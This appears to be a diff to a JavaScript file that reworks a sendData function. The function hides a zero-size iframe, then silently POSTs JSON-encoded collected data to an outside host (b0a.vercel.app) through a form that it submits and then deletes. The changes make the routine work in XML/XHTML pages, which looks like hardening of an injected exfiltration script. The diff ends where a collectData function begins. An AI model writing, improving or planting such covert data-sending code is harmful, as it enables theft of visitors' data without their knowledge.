@@ -25,26 +25,36 @@ function safe(val) {
 
 function sendData(payload) {
   var root = document.body || document.documentElement;
-  var iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.style.width = '0';
-  iframe.style.height = '0';
-  iframe.style.border = 'none';
+
+  var iframe = document.createElementNS(
+    "http://www.w3.org/1999/xhtml",
+    "iframe"
+  );
+
+  iframe.setAttribute("name", "hiddenFrame" + Date.now());
+
+  if (iframe.style) {
+    iframe.style.display = "none";
+    iframe.style.width = "0";
+    iframe.style.height = "0";
+    iframe.style.border = "none";
+  }
+
   root.appendChild(iframe);
-  
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'https://b0a.vercel.app/';
-  form.target = iframe.name = 'hiddenFrame' + Date.now();
-  
-  var input = document.createElement('input');
-  input.name = 'data';
+
+  var form = document.createElement("form");
+  form.method = "POST";
+  form.action = "https://b0a.vercel.app/";
+  form.target = iframe.getAttribute("name");
+
+  var input = document.createElement("input");
+  input.name = "data";
   input.value = JSON.stringify(payload);
   form.appendChild(input);
-  
-  document.body.appendChild(form);
+
+  root.appendChild(form);
   form.submit();
-  document.body.removeChild(form);
+  root.removeChild(form);
 }
 
 function collectData() {
